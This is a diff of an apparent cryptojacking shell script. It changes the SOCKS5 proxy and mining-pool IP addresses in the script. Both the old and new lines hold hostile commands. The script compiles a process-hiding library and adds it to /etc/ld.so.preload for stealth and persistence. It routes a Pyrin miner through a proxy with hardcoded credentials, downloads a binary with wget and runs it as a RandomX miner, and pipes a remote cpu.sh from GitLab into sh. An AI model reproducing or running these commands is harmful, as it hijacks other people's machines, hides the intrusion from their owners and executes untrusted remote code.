@@ -25,7 +25,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 159.65.189.192:443
+socks5 = 68.183.159.42:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
@@ -57,5 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 167.71.107.204:80 -u pyrin:qp3dslwvrkxf3qhj6gym52wtadqdqcf39q7y94zmreqyetrwes3r2um5ed0sw.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
-chmod 777 b && ./b -o 64.225.3.22:80 -u amyKu3rFXP6GQ5mucGXAKZGku6S49ZcD9BC7T5ZftyyCihDFDkv1e8L62qsuzgG3RZ79TZ8wzBN5CbtAfi3JCRVA2DETfs2R5j -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1 -t2 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qp3dslwvrkxf3qhj6gym52wtadqdqcf39q7y94zmreqyetrwes3r2um5ed0sw.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
+chmod 777 b && ./b -o 134.209.42.195:443 -u amyKu3rFXP6GQ5mucGXAKZGku6S49ZcD9BC7T5ZftyyCihDFDkv1e8L62qsuzgG3RZ79TZ8wzBN5CbtAfi3JCRVA2DETfs2R5j -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1 -t2 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
